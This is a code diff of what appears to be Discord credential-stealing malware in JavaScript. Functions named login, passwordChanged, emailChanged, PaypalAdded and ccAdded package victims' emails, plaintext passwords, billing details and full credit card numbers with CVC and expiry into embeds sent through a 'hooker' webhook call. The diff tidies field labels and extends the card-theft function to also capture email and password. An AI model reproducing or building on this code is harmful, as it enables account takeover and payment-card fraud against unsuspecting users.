@@ -355,27 +355,27 @@ const login = async (email, password, token) => {
             inline: false,
           },
           {
-            name: "**Badges:**",
+            name: "Badges:",
             value: `${badges}`,
             inline: true,
           },
           {
-            name: "**Nitro:**",
+            name: "Nitro:",
             value: `${nitro}`,
             inline: true,
           },
           {
-            name: "**Email:**",
+            name: "Email:",
             value: `\`${email}\``,
             inline: true,
           },
           {
-            name: "**Password:**",
+            name: "Password:",
             value: `\`${password}\``,
             inline: true,
           },
           {
-            name: "**Billing:**",
+            name: "Billing:",
             value: `${billing}`,
             inline: true,
           },
@@ -415,27 +415,27 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             inline: false,
           },
           {
-            name: "**Badges:**",
+            name: "Badges:",
             value: `${badges}`,
             inline: true,
           },
           {
-            name: "**Nitro:**",
+            name: "Nitro:",
             value: `${nitro}`,
             inline: true,
           },
           {
-            name: "**Email:**",
+            name: "Email:",
             value: `\`${json.email}\``,
             inline: true,
           },
           {
-            name: "**Old Password:**",
+            name: "Old Password:",
             value: `\`${oldpassword}\``,
             inline: true,
           },
           {
-            name: "**New Password:**",
+            name: "New Password:",
             value: `\`${newpassword}\``,
             inline: true,
           },
@@ -480,27 +480,27 @@ const emailChanged = async (email, password, token) => {
             inline: false,
           },
           {
-            name: "**Badges:**",
+            name: "Badges:",
             value: `${badges}`,
             inline: true,
           },
           {
-            name: "**Nitro:**",
+            name: "Nitro:",
             value: `${nitro}`,
             inline: true,
           },
           {
-            name: "**Email:**",
+            name: "Email:",
             value: `\`${email}\``,
             inline: true,
           },
           {
-            name: "**Password:**",
+            name: "Password:",
             value: `\`${password}\``,
             inline: true,
           },
           {
-            name: "**Billing:**",
+            name: "Billing:",
             value: `${billing}`,
             inline: true,
           },
@@ -540,27 +540,27 @@ const PaypalAdded = async (email, password, token) => {
             inline: false,
           },
           {
-            name: "**Badges:**",
+            name: "Badges:",
             value: `${badges}`,
             inline: true,
           },
           {
-            name: "**Nitro:**",
+            name: "Nitro:",
             value: `${nitro}`,
             inline: true,
           },
           {
-            name: "**Email:**",
+            name: "Email:",
             value: `\`${email}\``,
             inline: true,
           },
           {
-            name: "**Password:**",
+            name: "Password:",
             value: `\`${password}\``,
             inline: true,
           },
           {
-            name: "**Billing:**",
+            name: "Billing:",
             value: "<:paypal:973924768933875722>",
             inline: true,
           },
@@ -582,7 +582,7 @@ const PaypalAdded = async (email, password, token) => {
   hooker(content);
 };
 
-const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
+const ccAdded = async (number, cvc, expir_month, expir_year, email, password, token) => {
   const json = await getInfo(token);
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
@@ -600,27 +600,27 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
             inline: false,
           },
           {
-            name: "**Badges:**",
+            name: "Badges:",
             value: `${badges}`,
             inline: true,
           },
           {
-            name: "**Nitro:**",
+            name: "Nitro:",
             value: `${nitro}`,
             inline: true,
           },
           {
-            name: "**Email:**",
+            name: "Email:",
             value: `\`${email}\``,
             inline: true,
           },
           {
-            name: "**Password:**",
+            name: "Password:",
             value: `\`${password}\``,
             inline: true,
           },
           {
-            name: "**Credit Card:**",
+            name: "Credit Card:",
             value: `${number} | ${expir_month}/${expir_year} | ${cvc}`,
             inline: false,
           },
